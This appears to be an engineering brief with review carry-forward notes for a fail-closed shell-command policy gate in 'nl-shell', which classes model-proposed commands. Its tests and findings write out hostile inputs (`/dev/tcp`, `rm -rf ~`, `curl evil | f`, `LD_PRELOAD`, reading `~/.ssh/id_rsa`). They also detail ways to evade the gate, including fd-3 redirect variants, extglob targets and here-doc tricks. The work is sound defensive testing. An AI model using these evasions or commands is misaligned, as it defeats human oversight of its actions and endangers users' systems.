- **Slug:** ast-policy-gate-shell-layer
- **Kind:** enhancement
- **Defect / goal:** There is no policy gate on `main` (no `nl_shell.gate`, no
  tree-sitter dependency; `pyproject.toml` dependencies are only `prompt_toolkit`,
  `ptyprocess`, `PyYAML`). Add the `nl_shell.gate` package and its **shell layer**: parse
  a command with the pinned tree-sitter-bash and walk every node with one handler per
  named node kind of the pinned grammar (listed at run time from `tree_sitter.Language`;
  no test hard-codes the count). Any node kind without a handler fails closed. One
  context travels the walk: stdin source (terminal / pipe / file / literal here-doc or
  here-string text, with the text), redirects, depth, and a total-work budget across the
  whole classification. The walker hands each simple command to the command layer as an
  invocation: quote-removed words, each with a literal / non-literal flag; prefix
  assignments; redirects; stdin context. The command layer (`gate/rules.py`) ships as a
  **stub**: every simple command is `mutating`, reason "not allowlisted" (decision A's
  floor). The §7 step (`gate/live.py`) ships as a fail-closed stub: every simple command
  still `read-only` becomes `mutating`, reason "live-session resolution not implemented".
  `gate/sensitive.py` and `gate/words.py` ship as no-op stubs the pipeline already calls,
  for siblings #190 and #191 to replace.
  Decisions carried from the #189 split plan (agreed with the human at Plan,
  `results/issue_189/brief.md:99-112` in the pdca checkout), stated here so Do does not
  need the thread: **A** — an opaque command (no `commands.toml` row, not allowlisted) is
  at least `mutating`, reason "not allowlisted"; this child ships only that floor, the
  rest of A is #197. **B** — code the gate cannot read is at least `destructive`; #197.
  **C** — gate failure (unhandled node kind, work budget exceeded, any internal error)
  ⇒ `privileged`, rejected, reason "could not class"; `classify` never raises. C is
  this child's. Bundle names: "child-1" = #196 (this), "child-2" = #197, "child-3" =
  #198.
- **Success criterion:** `tests/test_policy_gate.py` passes, covering:
  - `policy-gate/v1` §1.1 characters: row 30 (`ls ‮txt.exe`, U+202E in a proposal) is
    rejected; the same text typed is at least `mutating`, reason "hidden character".
    A proposal holding a lone surrogate (`ls \udcff`) is rejected.
  - §1.2 unparseable: row 31 (`if true; then`) is `mutating`, reason contains
    "unparseable".
  - §1.7 model label: a proposal labelled `destructive` for `true` is `destructive`;
    a label never lowers the class: `true` labelled `read-only` stays `mutating`. Both
    are also run with `gate.rules` monkeypatched to return `read-only` for `true`, so
    the label is checked against a class below it (labelled `destructive` ⇒
    `destructive`; labelled `read-only` ⇒ the §7 stub's `mutating`).
  - Shell-level §2: row 7 (`PAGER=sh git log`) and row 13 (`LD_PRELOAD=./x.so ls`) give a
    prefix-assignment reason; row 15 (`ls > ~/.bashrc`) an output-redirect reason, while
    `>/dev/null`, `2>&1`, `1>&2`, `>&2` add none; row 14 (`cat </dev/tcp/example.org/80`)
    a `/dev/tcp` reason; row 16 (`$'\x72m' -rf ~`) and `$(echo rm) -rf ~` a non-literal
    command word reason; `diff <(ls) <(ls)` a process-substitution reason;
    `LESSOPEN='|sh %s' less f` a prefix-assignment reason. A command word that is a path
    outside the system directories (`/tmp/rm x`, `./rm x`) gets a path reason;
    `/usr/bin/rm x` and `//usr/bin/rm x` (leading slashes collapsed, as Linux resolves
    them — v1 regression) do not.
  - §1.2 also: `case x in` is unparseable (it parses to an `ERROR` node; `if true; then`
    to `MISSING "fi"`).
  - Shell-level §3: a function definition is `session-altering`. The whole §3 name list
    (`docs/design/specs/policy-gate/v1.md:104-107`, including the `LD_*`, `GIT_*`,
    `SUDO_*`, `PYTHON*`, `PERL5*` patterns and `PS0`–`PS4`) is this child's, matched on
    every `variable_assignment` node, standalone or inside a `declaration_command`.
    Cases: standalone `PATH=x`, `IFS=x`, `LD_PRELOAD=x`, `LD_LIBRARY_PATH=x`, `GIT_DIR=x`,
    `GIT_PAGER=x`, `PS1=x`, `PYTHONPATH=x`, `NODE_OPTIONS=x` and `export PATH=./bin`
    (spec row 5's setup) are `session-altering` with a reason naming the variable. Forms
    with no plain `variable_assignment` node (`export "PATH"=x`, `read`, `printf -v`, …)
    are #197's.
  - Shell-level §5: row 25 (`echo hi >&3`) and `3>x`, `{fd}>x`, `exec 3>&-`, `>&$x`,
    `<&$fd`, `>&"$X"`, `2>&${FD}`, and a 40-digit fd number (`echo x >&4444…`) are
    rejected (a descriptor the gate cannot prove is below 3 is rejected); any
    `variable_assignment` node naming `SUDO_PROMPT` or `SUDO_ASKPASS` is rejected, reason
    containing "SUDO_" — standalone or as a prefix: row 23 (`SUDO_PROMPT=x sudo true`) and
    `SUDO_ASKPASS=/x sudo true`, and `export SUDO_PROMPT=x` (tree-sitter-bash puts a
    `variable_assignment` node inside the `declaration_command`).
  - Walk coverage: every simple command inside pipelines, lists, subshells, `if` /
    `while` / `for` / `case` bodies, function bodies and command substitutions reaches
    the command layer (asserted on the invocation records). `declaration_command`
    (`export`, `declare`, `typeset`, `local`, `readonly`) and `unset_command` nodes are
    handed to the command layer as invocations with their command word, like a `command`
    node, so child-2 can give them meaning. A test enumerates every named
    node kind from the pinned `tree_sitter.Language` and asserts each one has a handler.
  - Stdin context, v2 regression (v2's walker recorded the second stage of
    `cat <<E | X` as reading the terminal instead of the pipe, so the sudo pipe rule never
    fired): in `cat <<E | sudo tee /x` and `cat <<E | doas id`
    (here-doc body `x`), the second stage's invocation has stdin = pipe, not terminal;
    `cat <x | y` and `cat <<<x | y` agree with it. `bash <<<'rm -rf ~'` and a quoted
    here-doc record the literal text.
  - Decision C: a node kind with its handler removed (monkeypatched), a budget overrun
    (deep nesting, and a long chain of substitutions that stays under the depth limit),
    and an internal error each give `privileged`, rejected, reason "could not class".
    `classify` never raises.
  - The §7 stub proof: with `gate.rules` monkeypatched to return `read-only` for `ls`,
    `classify("ls")` is `mutating`, reason "live-session resolution not implemented"
    (this exact string is defined here, in `gate/live.py`; #198 and #192 assert on it).
    `gate.live` is called directly with a `read-only` input and returns `mutating` with
    that reason. Across all other cases, no result is `read-only`.
  - Vectors: the conformance-row cases of this test are read from
    `targets/ubuntu-26.04/gate-vectors.toml` through the new loader (not repeated inline).
    The loader rejects, with an error naming the entry, a missing `command` or `class`, a
    class outside the five, an unknown key, and invalid TOML. The file's header says it
    holds the rows landed so far and is complete (spec Conformance, `v1.md:245-249`)
    only when #192 lands.
  The gate's output has the session-log `gate` shape `{"class", "reasons", "rejected"}`
  (`docs/design/specs/session-log/v1.md`).
- **Falsifiability:** plain pytest on the host. No gate exists on `main`, so every case
  fails on the red leg. Import `nl_shell.gate` inside test functions, never at module top
  (the harness's C4 script, `engine/scripts/run-verify.sh:192-196` in the pdca checkout,
  not the target, reports a module that fails to import as unverifiable). Every case asserts class, a reason substring, and
  (except the decision-C cases) that the reason is not "could not class".
- **Invariant to restore:** Nothing is classed `read-only` unless the gate has proved it
  (in this child, nothing is `read-only` at all). Syntax is closed: every node kind of
  the pinned grammar is handled, and anything unhandled, over budget or erroring fails
  closed. Sources: ADR-0013; `policy-gate/v1` §1 and Versioning; threat model Critical
  row "a non-read-only command runs with no confirm" (`.oss-scanner/threat_model.md:296`)
  and High row "a privileged or destructive step is classed lower" (`:303`).
- **Repo + branch target:** eduralph/nl-shell @ main
- **Milestone / ADRs:** M0 — REPL prototype. ADR-0013, ADR-0015, ADR-0023.
- **Reproduction:** n/a (new functionality). `python -c 'import nl_shell.gate'` fails on
  `main` (a6efb0a).
- **Surfaces:** data
- **Scope (one logical fix) / out of scope:** In scope: pins `tree-sitter==0.26.0` and
  `tree-sitter-bash==0.25.1` in `pyproject.toml`; `src/nl_shell/gate/` with
  `__init__.py` (the §1 pipeline, `classify`, the result type, decision C), `parse.py`
  (the walker, the context, the budget, the invocation record), `rules.py` (command-layer
  stub), stub `live.py`, stub `sensitive.py`, stub `words.py`; the §1.1 check reusing
  `nl_shell.render.has_hidden` (`src/nl_shell/render.py:136`) and rejecting a proposal the
  way `src/nl_shell/proposal.py:133` does; `targets/ubuntu-26.04/gate-vectors.toml` with
  this child's rows and a vector loader in the style of `src/nl_shell/targets.py:145-247`;
  `tests/test_policy_gate.py`. Out of scope: any per-command meaning — wrappers, sudo
  rules, destructive commands, builtins, decisions A (beyond the stub floor) and B
  (child-2); the allowlist, the terminal-read rule and the here-doc exemption (child-3);
  §7 (#192); §8 and the filesystem-state parts of §2 / §4 (#190); mixed-script words and
  the differential parser test (#191); the confirm UI and rows 35–36 (#74); REPL wiring
  and taint (#78); real allowlist entries (#139); sudo passthrough (#13). Do not reuse
  `src/nl_shell/failure_classes.py:199` `is_privileged`.
  For sign-off (human review per spec Versioning, `v1.md:238-241`; each is a raise, so
  v1-compatible): decision C is a new rule; the fd rule rejects any descriptor the gate
  cannot prove is below 3, stricter than §5's "3 or higher"; the §1.1 check uses
  `render.has_hidden`, which ignores quoting, so `echo '‮'` is rejected although §1.1
  forbids the characters only outside quotes. Do lists all three in build-notes. The
  spec text for C and the fd wording is #197's spec edit, not this child's.
- **External dependencies:** `tree-sitter-bash`
- **Test file:** tests/test_policy_gate.py
- **Difficulty:** high
- **Citations expected:** Do must cite path:line on the target branch for every change.
  Peers to mirror: `src/nl_shell/targets.py:145-247`, `src/nl_shell/render.py:136`,
  `src/nl_shell/proposal.py:133`.
- **Prior-art check (triage cycles):** no `src/nl_shell/gate` on `origin/main` (a6efb0a).
  v2's walker (`results/issue_189/iteration-v2/patch.diff` in the pdca checkout — a
  rejected attempt, not target code, so not cited as `path:line` on the target) is a
  reference for node handling, but its here-doc pipeline handling is the stdin-context
  bug described in the success criterion.
- **Impact & compatibility:** new runtime dependency. `tree-sitter-bash` declares MIT;
  the `tree-sitter` wheel declares no license field — confirm at sign-off (INTEGRATION §4,
  human-only). Both pins exist on PyPI (requires-python ≥3.10) and fit together:
  `tree-sitter-bash` 0.25.1's `core` extra asks for `tree-sitter~=0.24`, which 0.26.0
  meets. No REPL change.
- **Disposition hint:** new-feature

Plan-review response: findings taken. Decisions A–C are now stated inline with their
source (the #189 split plan) and the child names map to bundle ids. The §7 stub proof
and the label rule are tested with `gate.rules` monkeypatched to `read-only`, so a
missing `live.py` or a lowering label fails. Decision C, the stricter fd rule and the
quote-blind §1.1 check are listed for human review at sign-off. The full §3 list,
standalone or exported, is this child's, with `export PATH=./bin` as a case. The
vectors file is now read by the tests, its loader has rejection cases, and its header
says it is partial until #192. Harness and v2 paths are marked as pdca-checkout
paths, and the v2 bug is described. The hard-coded "59" is gone, and the pins were
checked on PyPI. The thread record is #189's (`results/issue_189/notes.json`, plus its
brief for A–C). This bundle declares no dependency.

## Iteration 1 — carry-forward (from the previous attempt)
- Sign-off rationale: Auto-iterate (round 1): rebuilding for the implementation-level findings — T2 Shape — Decide whether the new parser input and fail-closed properties require a threat-model update — the security-path scanner found no corresponding update; gate-logs/T2-threat-model.log:10.; **A move-descriptor redirect to fd 3 or higher is not rejected.** At `src/nl_shell/gate/parse.py:466-476`, a `>&` target that is not all digits and not `-` is treated as "`>&file`", so `>&3-` and `1>&3-` only get "output redirection" (mutating, `rejected=False`). In bash, `[n]>&digit-` *moves* descriptor `digit` onto `n`, so the command writes to fd 3. I confirmed this with real bash: `exec 3>f; echo via-move >&3-` writes to `f`. Probe results: `classify("echo hi >&3-")` gives `mutating False ["output redirection: '>&3-'", ...]`, and the same for `1>&3-`. This breaks the brief's §5 rule ("a descriptor the gate cannot prove is below 3 is rejected"), which row 25 (`echo hi >&3`) exists to enforce. The `<&3-` form is rejected, but only because it falls into the `else` branch at `:478`. Fix: when the target matches `^\d+-$`, check the digits with `_below_three`. Add `>&3-` and `1>&3-` to `test_descriptor_not_provably_below_three_is_rejected` (`tests/test_policy_gate.py:272`).; **The work budget does not cover parsing or the named-fd scan.** `parse.py:240` parses the whole text before any budget is spent. `parse.py:441-443` copies and regex-searches the entire source prefix (`self.source[: node.start_byte]`) for every redirect, which is quadratic. Measured: a 6 MB proposal takes 7.7 s before ending in "could not class". A 2 MB word followed by 6000 `>x` takes 3.1 s. The brief says the budget is "a total-work budget across the whole classification". Fix: cap the input length up front (decision C), and look only at a bounded window of bytes (for example the last 256) before the redirect.; **High on the threat model's scale ("printed text forges a control-channel record"), but a confirm is still required and the gate is not wired yet.** At `src/nl_shell/gate/parse.py:466-476`, the fd rule misses bash's fd-move form `[n]>&digit-` (it moves descriptor `digit` onto `n`, see the bash manual under REDIRECTION). Input: the model's proposal. For `echo hi >&3-`, the target value is `3-`. That is not all digits and not `-`, so the `>&` branch treats it as `&>file` and calls `_output`. The result is `mutating` with an "output redirection" reason, **not rejected**, even though the command writes to fd 3 (the control channel, ADR-0014). This breaks the brief's own rule: "a descriptor the gate cannot prove is below 3 is rejected". `<&3-` is rejected, but only by the catch-all `else` at `:477-478`. `1>&3-` and `>&'3'-` go the same wrong way as `>&3-`. Fix: treat a literal target matching `[0-9]+-` as a descriptor and run it through `_below_three`. Add `echo hi >&3-`, `1>&3-` and `cat <&3-` to `test_descriptor_not_provably_below_three_is_rejected` (`tests/test_policy_gate.py:258-273`). That test lists no move form today. Not confirmed here (no tree-sitter in this sandbox). The new test cases will confirm or refute it.. Deferred, not addressed here: 12 finding(s) that need human judgment, held in deferred-findings.json for the human at handover — not build work
- Full previous attempt preserved in `iteration-v1/` (patch.diff, build-notes.md, SUMMARY.md, check-*).
- Address the above; do NOT re-attempt the rejected approach unchanged. Satisfy the brief's Success criterion (the end result).

## Iteration 2 — carry-forward (from the previous attempt)
- Sign-off rationale: Auto-iterate (round 2): rebuilding for the implementation-level findings — **A line continuation hides an fd-3 redirect from the §5 rule.** `src/nl_shell/gate/parse.py:260` hands the raw text to tree-sitter. tree-sitter-bash does not join backslash-newline inside a redirect operator, but bash does (I checked: `exec 3>f; echo via-cont >\⏎&3` writes to `f`; `echo d 1\⏎>/dev/null` prints nothing). Gate results:; **A command inside a `number` node never reaches the command layer.** `parse.py:773` lists `number` in `_LEAVES`, so `_leaf` does not walk its children. tree-sitter-bash puts the substitution in `echo $((10#$(rm x)))` under `number`: `(arithmetic_expansion (number (command_substitution (command …))))`. The walk produces one invocation (`echo`) for two `command` nodes, so `rm x` is never classed. Bash does run it (`echo $((10#$(echo 7)))` prints `7`). The class is still `mutating` today only because the stub floors everything. Once #197 classes `echo` as read-only, this hides a `destructive` command. This breaks the brief's walk-coverage criterion ("every simple command inside … command substitutions reaches the command layer"). Fix: handle `number` with `_children`, like `word`, whose children `_evaluate` already guards against. Add a test that, for every leaf-handled kind, parses inputs and asserts the node has no named children, or more simply counts `command` nodes against invocations. The current "every kind has a handler" test cannot catch a handler that drops children.; **`<<-` here-doc with a tab-indented first line: the substitution is recorded as literal stdin text and its command is missed.** For `cat <<-E⏎\t$(rm x)⏎E`, tree-sitter-bash 0.25.1 returns a `heredoc_body` with **no** `command_substitution` child (the same body without the tab, or with a non-tab first line, does parse it). `_heredoc_text` (`parse.py:571-581`) only checks for `\` and non-`heredoc_content` children. So the invocation gets `Stdin(heredoc, text='$(rm x)\n')`, marked literal, and `rm x` produces no invocation. Bash expands it (`cat <<-E⏎\t$(echo RAN)⏎E` prints `RAN`). Backticks behave the same: `` \t`rm x` ``. The brief says only *literal* here-doc text is recorded, and child-3's here-doc exemption will trust that text. Fix: when the delimiter is unquoted, treat any `$` or `` ` `` in the body text as non-literal (text=None), whatever the tree says. If the tree has no substitution node for it, fail closed. Add the case to `test_literal_input_text_is_recorded` (`tests/test_policy_gate.py:387`) as a negative.; **A redirect after the last pipeline stage is given to the wrong stages.** tree-sitter-bash attaches a trailing redirect to the whole pipeline: `(redirected_statement body: (pipeline …) redirect: …)`. `_redirected_statement` (`parse.py:632-641`) applies that redirect's stdin and redirects to the pipeline, and `_pipeline` (`:619`) then gives it to the **first** stage. Results:; **High on the scale's closest row ("printed text forges a control-channel record"); impact today is small because a confirm is still needed and #135 already lists commands writing to fd 3.** `src/nl_shell/gate/parse.py:519-525`: a redirect to a *path* that names descriptor 3 or higher is not rejected. The input is the model's proposal. For `echo 'D 0' >/dev/fd/3`, the target is a literal file name, so `check_redirect` sends it to `_output`. The result is `mutating`, "output redirection", with `rejected=False`. In bash, a redirect to `/dev/fd/N` duplicates descriptor N (bash manual, REDIRECTION). On Linux the open goes through `/proc/self/fd/3` to the same pipe, so the command writes to the control channel (ADR-0014). This breaks the property the patch itself writes into the threat model (`threat_model.md:120-121`: "A redirection the gate cannot prove uses only descriptors 0-2 … is rejected"), and spec §5 (`docs/design/specs/policy-gate/v1.md:126`: "any redirection involving file descriptor 3 or higher"). The same hole covers `>>/dev/fd/3`, `<>/dev/fd/3`, `>&/dev/fd/3`, `cat </dev/fd/3`, `>/proc/self/fd/3` and `>/dev/fd/03`. Fix: when a literal redirect target (after quote removal and collapsing repeated slashes) is `/dev/fd/<n>` or `/proc/self/fd/<n>` / `/proc/thread-self/fd/<n>`, reject it unless `_below_three(n)` holds. `/dev/stdin`, `/dev/stdout` and `/dev/stderr` are fine. Test: add `echo x >/dev/fd/3`, `echo x >>/dev/fd/3`, `cat </dev/fd/3`, `echo x >/proc/self/fd/3` and `echo x >//dev/fd/3` to `test_descriptor_not_provably_below_three_is_rejected` (`tests/test_policy_gate.py:259-283`). Today that test lists only `&`-operator and numeric-descriptor forms, so the path form is never exercised.; **Low today (stubs consume nothing). It becomes High ("a sensitive location is read without a confirm") once #190 trusts the flag.** `src/nl_shell/gate/parse.py:289-298`, `:305-318`: an unquoted leading `~` (and `~` after `:` or `=` in an assignment value) is marked `literal=True` with value `~…`, but bash performs tilde expansion on it. The brief defines `literal` as "False when the shell would still expand it". Input: the proposal `cat ~/.ssh/id_rsa` gives an argument `Word(value="~/.ssh/id_rsa", literal=True)`. If #190 resolves that relative to the cwd, as `./~/.ssh/id_rsa`, it misses `sensitive.toml`. The command word `~/rm x` is caught today only because it holds a `/`. Fix: in `word()`, mark a word non-literal when its shape starts with an unquoted `~` (the shape keeps escaped and quoted characters as `x`, so `\~` and `'~'` stay literal). Do the same for assignment values with an unquoted `~` after `=` or `:`. Test: in `test_invocation_record_shape` or a new case, assert `cat ~/x` has `(None or "~/x", False)` for its second word, and `cat '~'/x` and `cat \~/x` stay literal.; **Low ("information leaks in error messages" is the nearest row; the real risk is display, not leaks).** `src/nl_shell/gate/parse.py:756-757`: the function-definition reason puts the raw source text of the function name into `reasons` without `!r`. Every other reason that carries attacker text uses `!r` (`:495`, `:497`, `:525`, `:705`, `:709`). Input: the typed or proposed `function $'\e]52;c;…\a' { :; }`, or a name holding bidi characters. The proposal path is rejected by §1.1, but the reason string still holds the bytes and lands in the session-log `gate` record and, later, in the confirm UI. #74's renderer is meant to escape it, but the gate should not depend on that. Fix: `f"function definition: {label!r}"`. Test: a typed `function f$'\x1b' { :; }` gives a reason with no raw `\x1b`.. Deferred, not addressed here: 10 finding(s) that need human judgment, held in deferred-findings.json for the human at handover — not build work
- Full previous attempt preserved in `iteration-v2/` (patch.diff, build-notes.md, SUMMARY.md, check-*).
- Address the above; do NOT re-attempt the rejected approach unchanged. Satisfy the brief's Success criterion (the end result).

## Iteration 3 — carry-forward (from the previous attempt)
- Sign-off rationale: Human chose iterate-do and explicitly overrode the size-backstop recommendation (iterate-plan); do not re-split this round. Fix the confirmed bypasses from round-3 adversary/security review, each with a test: - Here-doc delimiter with quotes (<<E"F", <<$'E', <<\E): compute bash's quote-removed delimiter; fail closed if a body line equals it or heredoc_end differs; fail closed on a here-doc inside an ERROR tree (incl. `cat <<E;cat <<F` on one line). - Descriptor paths: reject globbed redirect targets (>/dev/f?/3, >>/d*/fd/3) and /proc/<x>/root/ (and task/<tid>/root) prefixes (>/proc/self/root/dev/fd/3, >/proc/self/root/proc/self/fd/3). - Named fd with array subscript ({a[0]}>&-, {a[0]}>x) must be rejected. - Line continuation inside double quotes after $ or backquote ("$\<newline>(rm x)") must fail closed. - bash 5.3 funsub ${ cmd; } / ${| cmd; } (also in here-doc bodies) must fail closed. - Correct the threat-model "linear time" claim (tree-sitter parse is quadratic on "${"*n, ~2.3 s at the 64 KiB cap). Open scope questions NOT decided by the human this round (non-literal redirect targets like >$F; ((PATH=0)) arithmetic assignments): do not widen behaviour for them; keep the threat-model wording accurate to what the code actually rejects.
- Sign-off session carry-forward (captured live, before §9 flattened it):
  Human chose iterate-do and explicitly overrode the size-backstop recommendation (iterate-plan); do not re-split this round.
  Fix the confirmed bypasses from round-3 adversary/security review, each with a test:
  - Here-doc delimiter with quotes (<<E"F", <<$'E', <<\E): compute bash's quote-removed delimiter; fail closed if a body line equals it or heredoc_end differs; fail closed on a here-doc inside an ERROR tree (incl. `cat <<E;cat <<F` on one line).
  - Descriptor paths: reject globbed redirect targets (>/dev/f?/3, >>/d*/fd/3) and /proc/<x>/root/ (and task/<tid>/root) prefixes (>/proc/self/root/dev/fd/3, >/proc/self/root/proc/self/fd/3).
  - Named fd with array subscript ({a[0]}>&-, {a[0]}>x) must be rejected.
  - Line continuation inside double quotes after $ or backquote ("$\<newline>(rm x)") must fail closed.
  - bash 5.3 funsub ${ cmd; } / ${| cmd; } (also in here-doc bodies) must fail closed.
  - Correct the threat-model "linear time" claim (tree-sitter parse is quadratic on "${"*n, ~2.3 s at the 64 KiB cap).
  Open scope questions NOT decided by the human this round (non-literal redirect targets like >$F; ((PATH=0)) arithmetic assignments): do not widen behaviour for them; keep the threat-model wording accurate to what the code actually rejects.
- Full previous attempt preserved in `iteration-v3/` (patch.diff, build-notes.md, SUMMARY.md, check-*).
- Address the above; do NOT re-attempt the rejected approach unchanged. Satisfy the brief's Success criterion (the end result).

## Iteration 4 — carry-forward (from the previous attempt)
- Sign-off rationale: Human chose iterate-do and again explicitly overrode the size-backstop recommendation (iterate-plan); do not re-split this round. Fix the confirmed round-4 adversary/security findings, each with a test: - Two here-docs joined by |, &&, || on one line (cat <<A | cat <<B ...): tree-sitter nests the second heredoc_redirect inside the first and mis-assigns bodies, hiding a line from the gate. Fail closed when a heredoc_redirect contains another heredoc_redirect, or when here-doc bodies are not in the same source order as their heredoc_start nodes. Add the |, &&, || reproducers as decision-C cases. - Extglob redirect targets (>/dev/@(fd)/3, >/dev/+(fd)/3, >/dev/!(x)/3, >/proc/@(self)/fd/3, >/@(dev)/fd/3) must be rejected: treat a file-redirect target followed by "(" and ending in one of ?*+@! as a pattern, or reject any file redirect inside a tree with an ERROR node. - /proc/<x>/cwd/ and /proc/<x>/task/<t>/cwd/ redirect targets must be treated as unprovable descriptors (rejected), like "..". - Correct the parse-time figure in the threat model and parse.py comment: worst known input is "$[" repeated (~12.7 s at the 64 KiB cap; "a=(" ~7.7 s, "${" ~3.0 s), or bound the parse via tree-sitter's progress_callback and treat cancellation as decision C. Add a timing test. Keep the threat-model wording accurate to what the code actually rejects. Do not widen behaviour for the still-undecided scope questions (non-literal redirect targets like >$F; arithmetic assignments).
- Sign-off session carry-forward (captured live, before §9 flattened it):
  Human chose iterate-do and again explicitly overrode the size-backstop recommendation (iterate-plan); do not re-split this round.
  Fix the confirmed round-4 adversary/security findings, each with a test:
  - Two here-docs joined by |, &&, || on one line (cat <<A | cat <<B ...): tree-sitter nests the second heredoc_redirect inside the first and mis-assigns bodies, hiding a line from the gate. Fail closed when a heredoc_redirect contains another heredoc_redirect, or when here-doc bodies are not in the same source order as their heredoc_start nodes. Add the |, &&, || reproducers as decision-C cases.
  - Extglob redirect targets (>/dev/@(fd)/3, >/dev/+(fd)/3, >/dev/!(x)/3, >/proc/@(self)/fd/3, >/@(dev)/fd/3) must be rejected: treat a file-redirect target followed by "(" and ending in one of ?*+@! as a pattern, or reject any file redirect inside a tree with an ERROR node.
  - /proc/<x>/cwd/ and /proc/<x>/task/<t>/cwd/ redirect targets must be treated as unprovable descriptors (rejected), like "..".
  - Correct the parse-time figure in the threat model and parse.py comment: worst known input is "$[" repeated (~12.7 s at the 64 KiB cap; "a=(" ~7.7 s, "${" ~3.0 s), or bound the parse via tree-sitter's progress_callback and treat cancellation as decision C. Add a timing test.
  Keep the threat-model wording accurate to what the code actually rejects. Do not widen behaviour for the still-undecided scope questions (non-literal redirect targets like >$F; arithmetic assignments).
- Full previous attempt preserved in `iteration-v4/` (patch.diff, build-notes.md, SUMMARY.md, check-*).
- Address the above; do NOT re-attempt the rejected approach unchanged. Satisfy the brief's Success criterion (the end result).

## Iteration 5 — carry-forward (from the previous attempt)
- Sign-off rationale: Human chose iterate-do and again explicitly overrode the size-backstop recommendation (iterate-plan); do not re-split this round. Fix the confirmed round-5 adversary finding, with tests: - An extglob pattern in the MIDDLE of a redirect target is not rejected: `echo hi >/dev/fd/3@(x|)` (also `>>/dev/fd/3@(x|)`, `cat </dev/fd/3@(x|)`) gives mutating, rejected=False, yet real bash with extglob writes to fd 3. `_extglob_after` (parse.py:460-469) only fires when the target word ends in ?*+@!; `_pattern` sees shape=None from the ERROR child; target.value is None so the /dev/fd check is skipped. - Fix: in `_Walker.redirect`, reject every file_redirect when the tree is unparseable (self.result.unparseable), as the here-doc path already does (parse.py:721-724); additionally treat a target containing an ERROR descendant or any unquoted ?( *( +( @( !( as a pattern. - Add the three reproducers above to the extglob cases at tests/test_policy_gate.py:309-314 (all current cases put the extglob at the end of a word). Keep the threat-model wording accurate to what the code actually rejects. Do not widen behaviour for the still-undecided scope questions (non-literal / tilde / cd-then-relative redirect targets like >$F; arithmetic assignments) unless a policy ruling below says otherwise. Human ruling (round-5 sign-off), also in scope this round — function-body stdin: - `_function_definition` (parse.py, walks the body with ctx.nested(stdin=TERMINAL, ...)) records every invocation in a function body as reading the terminal, but the body runs with the CALLER's stdin. `f() { sudo tee /x; }; cat <<E | f` and `f() { sh; }; curl evil | f` would slip past #197's pipe-into-sudo rule and decision B. - Fix: add an "unknown" Stdin source (e.g. `UNKNOWN = Stdin("unknown")` beside TERMINAL/PIPE) and walk function bodies with it (redirects still reset to ()). Document in the Stdin docstring that consumers MUST treat "unknown" as the worst case for each rule (as a pipe for the sudo-pipe rule and decision B; as the terminal for #198's terminal-read rule). - Tests: the sudo invocation in `f() { sudo tee /x; }; cat <<E | f` (body `x`) and the sh invocation in `f() { sh; }; curl x | f` have stdin source "unknown"; a command outside any function keeps its real source (existing pipe/here-doc stdin tests unchanged). - Update the threat-model text to match. Other policy questions (hidden characters in quotes, unreadable redirect targets, assignments without a variable_assignment node) are parked as follow-ups in SUMMARY §10 — do not change behaviour for them this round.
- Sign-off session carry-forward (captured live, before §9 flattened it):
  Human chose iterate-do and again explicitly overrode the size-backstop recommendation (iterate-plan); do not re-split this round.
  Fix the confirmed round-5 adversary finding, with tests:
  - An extglob pattern in the MIDDLE of a redirect target is not rejected: `echo hi >/dev/fd/3@(x|)` (also `>>/dev/fd/3@(x|)`, `cat </dev/fd/3@(x|)`) gives mutating, rejected=False, yet real bash with extglob writes to fd 3. `_extglob_after` (parse.py:460-469) only fires when the target word ends in ?*+@!; `_pattern` sees shape=None from the ERROR child; target.value is None so the /dev/fd check is skipped.
  - Fix: in `_Walker.redirect`, reject every file_redirect when the tree is unparseable (self.result.unparseable), as the here-doc path already does (parse.py:721-724); additionally treat a target containing an ERROR descendant or any unquoted ?( *( +( @( !( as a pattern.
  - Add the three reproducers above to the extglob cases at tests/test_policy_gate.py:309-314 (all current cases put the extglob at the end of a word).
  Keep the threat-model wording accurate to what the code actually rejects. Do not widen behaviour for the still-undecided scope questions (non-literal / tilde / cd-then-relative redirect targets like >$F; arithmetic assignments) unless a policy ruling below says otherwise.
  Human ruling (round-5 sign-off), also in scope this round — function-body stdin:
  - `_function_definition` (parse.py, walks the body with ctx.nested(stdin=TERMINAL, ...)) records every invocation in a function body as reading the terminal, but the body runs with the CALLER's stdin. `f() { sudo tee /x; }; cat <<E | f` and `f() { sh; }; curl evil | f` would slip past #197's pipe-into-sudo rule and decision B.
  - Fix: add an "unknown" Stdin source (e.g. `UNKNOWN = Stdin("unknown")` beside TERMINAL/PIPE) and walk function bodies with it (redirects still reset to ()). Document in the Stdin docstring that consumers MUST treat "unknown" as the worst case for each rule (as a pipe for the sudo-pipe rule and decision B; as the terminal for #198's terminal-read rule).
  - Tests: the sudo invocation in `f() { sudo tee /x; }; cat <<E | f` (body `x`) and the sh invocation in `f() { sh; }; curl x | f` have stdin source "unknown"; a command outside any function keeps its real source (existing pipe/here-doc stdin tests unchanged).
  - Update the threat-model text to match.
  Other policy questions (hidden characters in quotes, unreadable redirect targets, assignments without a variable_assignment node) are parked as follow-ups in SUMMARY §10 — do not change behaviour for them this round.
- Full previous attempt preserved in `iteration-v5/` (patch.diff, build-notes.md, SUMMARY.md, check-*).
- Address the above; do NOT re-attempt the rejected approach unchanged. Satisfy the brief's Success criterion (the end result).

## Iteration 6 — carry-forward (from the previous attempt)
- Sign-off rationale: Slice is oversized: 110 KB patch / 12 files, 5 rounds, and each review round finds new parser edge cases instead of converging. Split in Plan (`nl-shell-pdca split 196`), e.g. (1) core parser/walker + Decision C fail-closed fallback, (2) descriptor/redirect rules, (3) stdin provenance tracking. Carry forward as known gaps for the children: fd-0 output dup/close (`0>&1`, `0>&-`) not tracked; `>(cmd)` should give cmd stdin=pipe; the "reject every file redirect in an unparseable tree" rule has no test that pins it; that rule also rejects harmless typed extglob + `2>/dev/null` (policy call: proposals only, or only redirects touching the ERROR node?); loose redirect tokens inside ERROR nodes may escape rejection (unconfirmed, probe `echo @(x|) >&3` with pinned grammar). Many §6 items are stale from earlier rounds (T2 threat model, §7 stub proof, function-body stdin) — the re-plan should start from a fresh list.
- Sign-off session carry-forward (captured live, before §9 flattened it):
  Slice is oversized: 110 KB patch / 12 files, 5 rounds, and each review round finds new parser edge cases instead of converging. Split in Plan (`nl-shell-pdca split 196`), e.g. (1) core parser/walker + Decision C fail-closed fallback, (2) descriptor/redirect rules, (3) stdin provenance tracking.
